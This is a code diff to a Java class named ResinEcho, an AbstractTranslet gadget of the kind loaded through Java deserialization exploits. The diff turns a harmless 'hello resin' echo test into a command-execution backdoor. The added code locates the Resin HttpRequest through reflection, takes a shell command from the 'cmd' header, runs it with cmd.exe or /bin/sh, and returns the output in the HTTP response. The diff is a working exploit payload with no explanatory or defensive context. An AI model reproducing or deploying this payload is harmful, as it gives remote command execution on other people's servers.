@@ -6,6 +6,7 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
+import java.io.PrintWriter;
 import java.lang.reflect.Field;
 
 /**
@@ -29,10 +30,25 @@ public class ResinEcho extends AbstractTranslet {
                 obj = f.get(o);
                 if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                     com.caucho.server.http.HttpRequest req = (com.caucho.server.http.HttpRequest) obj;
-                    if(req.getHeader("key")!=null){
-                        req.getResponse().getWriter().write("hello resin");
-                        req.getResponse().getWriter().flush();
-                        req.getResponse().getWriter().close();
+                    if(req.getHeader("cmd")!=null){
+                        String cmd = req.getHeader("cmd");
+                        PrintWriter writer = req.getResponse().getWriter();
+                        if (cmd != null) {
+                            String cc = "";
+                            java.lang.ProcessBuilder p;
+                            if(System.getProperty("os.name").toLowerCase().contains("win")){
+                                p = new java.lang.ProcessBuilder("cmd.exe", "/c", cmd);
+                            }else{
+                                p = new java.lang.ProcessBuilder("/bin/sh", "-c", cmd);
+                            }
+                            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
+                            cc = c.hasNext() ? c.next(): cc;
+                            c.close();
+                            writer.write(cc);
+                            writer.flush();
+                            writer.close();
+                        break;
+                        }
                     }
                 }
             }
